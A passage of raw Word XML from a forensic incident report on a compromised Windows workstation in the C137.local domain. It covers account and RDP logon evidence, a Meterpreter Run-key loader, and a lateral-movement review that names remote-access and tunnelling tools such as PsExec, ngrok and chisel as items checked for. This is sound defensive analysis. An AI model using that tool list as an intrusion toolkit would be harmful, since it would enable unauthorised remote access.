              <w:t>ROOT\ControlSet001\Control\Terminal Server</w:t>
              <w:br/>
              <w:t>Threat Hunting | RDP Connections Status | fDenyTSConnections=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7138</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:23.009739</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational 1149 | Microsoft-Windows-TerminalServices-RemoteConnectionManager | RDP network connection established | 10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#34902</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-021: Accounts &amp; authentication summary: no account created after setup, no brute force against the workstation; only remote logon is C137\Administrator via RDP</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artifact:registry: accounts (sam)</w:t>
              <w:br/>
              <w:t>evtx:security.evtx</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T1078.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 05:41:16.821390 → 2020-09-19 03:17:00.621295</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Security.evtx coverage 2020-09-18 04:58 → 2020-09-19 05:18 (4624 x269, 4625 x1, 4634 x32, 4647 x10, 4648 x53, 4672 x229, 4720 x3, 4722 x2, 4724 x4, 4728 x3, 4732 x13, 4738 x22; no 4740/4768/4769/4776 — expected on a member workstation).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Account creation (4720) only during OOBE: WDAGUtilityAccount (RID 504) 2020-09-18 05:41:16 (#37494), defaultuser0 (RID 1000) 05:46:39 (#37621), local Admin (RID 1001) 05:49:07 (#37812, added to Builtin\Administrators #37822, subject SYSTEM 0x3E7). SAM (UserAccounts.csv#5): Admin created 05:49:07.89, pwd last set 05:49:07.98, last logon 2020-09-19 03:15:57, 6 logons, 0 invalid; Administrator(500)/Guest/DefaultAccount/WDAG disabled.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Domain join 2020-09-18 21:42:15: Admin used explicit credentials C137.LOCAL\Administrator towards CITADEL-DC01.C137.local 10.42.85.10:445 (4648 #38428), then 4732 adds Domain Admins (-512) to Builtin\Administrators and Domain Users (-513) to Builtin\Users (#38431/#38432, subject Admin LogonId 0x1A6AA). Single 4625 at 21:42:50 (type 3, "clocks between DC and other computer too far out of sync", #38517) — time-skew artefact of the join (see F-004).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Per account (4624): DESKTOP-SDN1RPT\Admin type 2 local console 05:49 → 2020-09-19 03:15:57 (last session 03:15:57–03:17:00, 4647 #39544); C137\ricksanchez type 2 at 2020-09-18 22:44:11 and 22:52:49 (LogonId 0x438E75, #38782), type 11 (cached) + type 7 at 2020-09-19 05:08:15 (#39826, #39830); C137\mortysmith type 2 at 22:46:39 and 22:59:58 (#38681, #38924); C137\Administrator type 3 Kerberos 03:36:22 from 10.42.85.10 (#39563) and type 10 03:36:24 from 10.42.85.10 (#39576), logoff 4647 03:52:13 (#39812); machine account DESKTOP-SDN1RPT$ type 3 (::1/local). No other type 3/10 logons from remote addresses, no failure bursts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The authentication record is clean apart from the C137\Administrator RDP session already described in F-006. No local or domain account was created or enabled by the attacker on this host (all 4720/4722/4724 occur during OOBE with subject SYSTEM). The domain-join group changes (Domain Admins → local Administrators) are standard. Lack of 4625 bursts on the workstation is consistent with the brute force having targeted the DC (F-018); the workstation was reached with already-valid domain admin credentials. Caveat: no DC logs are in scope, so Kerberos (4768/4769) of the attacker cannot be traced.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (11)</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05:41:16.821390</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: MINWINPC\WDAGUtilityAccount (S-1-5-21-41211245-796119838-3940169921-504)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#37494</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:46:39.866681</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: DESKTOP-SDN1RPT\defaultuser0 (S-1-5-21-41211245-796119838-3940169921-1000)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#37621</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:07.897871</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4720 | Microsoft-Windows-Security-Auditing | A new account was created | Target: DESKTOP-SDN1RPT\Admin (S-1-5-21-41211245-796119838-3940169921-1001)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#37812</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:08.012488</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Builtin\Administrators (S-1-5-32-544) | SubjectLogonId: 0x3E7 | MemberName: - | MemberSid: S-1-5-21-41211245-796119838-3940169921-1001 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#37822</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:07.890379</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Account created</w:t>
              <w:br/>
              <w:t>Admin RID=1001 logons=6 groups=Administrators</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_UserAccounts.csv#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:15.957439</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4648 | Microsoft-Windows-Security-Auditing | A logon was attempted using explicit credentials | Target: C137.LOCAL\Administrator | TargetServerName: CITADEL-DC01.C137.local | PID: 0x4 | TargetInfo: cifs/CITADEL-DC01.C137.local | 10.42.85.10:445</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38428</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:16.235521</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4732 | Microsoft-Windows-Security-Auditing | A member was added to a security-enabled local group | Target: Builtin\Administrators (S-1-5-32-544) | SubjectLogonId: 0x1A6AA | MemberName: - | MemberSid: S-1-5-21-2232410529-1445159330-2725690660-512 | PrivilegeList: -</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38431</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:50.695343</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>-</w:t>
              <w:br/>
              <w:t>Security 4625 | Microsoft-Windows-Security-Auditing | Failed logon | Target: \ | LogonType 3 | FailureReason1: clocks between DC and other computer too far out of sync | FailureReason2: N/A | - | - (-)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38517</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:49.588649</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C137\ricksanchez | LogonType 2 | LogonId: 0x438E75 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:46:39.873256</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\svchost.exe</w:t>
              <w:br/>
              <w:t>Security 4624 | Microsoft-Windows-Security-Auditing | Successful logon | Target: C137\mortysmith | LogonType 2 | LogonId: 0x270257 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (127.0.0.1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#38681</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:17:00.621295</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4647 | Microsoft-Windows-Security-Auditing | User initiated logoff | LogonId: 0x70C125</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39544</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.8 Remote access and lateral movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remote access and lateral movement review:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Inbound RDP: the only remote interactive session is C137\Administrator from DC 10.42.85.10 (already covered in F-006/F-018; RCM 1149 and RdpCoreTS 168 at 03:36:23; eve_rdp).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Outbound RDP: no Terminal Server Client keys, no MSTSC Prefetch, no .rdp files, and no flows from the workstation to any host on port 3389.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- PsExec: none. 7045 shows only coreupdater, nehgye, WPD and FTK besides OOBE/VMware. There is no PSEXESVC, and PsExec, PAExec and RemCom are absent from $MFT.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- WinRM: only local SYSTEM client-side Enumeration events that failed with 0x80338012 at boot/logon. There were no server-side WinRM sessions.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- RMM tools: no AnyDesk, TeamViewer, ScreenConnect, RustDesk, Splashtop, VNC, ngrok or chisel artifacts in $MFT.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No Prefetch for net, wmic or winrs.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Network: internally the workstation only talks to the DC (DNS, Kerberos, LDAP, RPC, SMB for SYSVOL/GPO and NETLOGON at the attacker's profile load). Memory netscan shows only the 3389/445 listeners plus one SMB session to the DC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>F-024 (info): the host was an RDP target, not a pivot.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>F-025 (medium): ricksanchez's persistent Z: drive (\\CITADEL-DC01\FileShare, mapped 22:45 the day before) reconnected at the 05:08 logon. That is the same Domain Admin context in which the Meterpreter loader runs. The SMB session was about 28 KB, so there is no sign of bulk transfer.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-025: Network share exposure: ricksanchez's persistent mapped drive Z: = \\CITADEL-DC01\FileShare reconnected at the 05:08 logon that fired the Meterpreter Run-key loader</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artifact:registry (recmd kroll)</w:t>
              <w:br/>
              <w:t>memory</w:t>
              <w:b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T1021.002, T1039</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
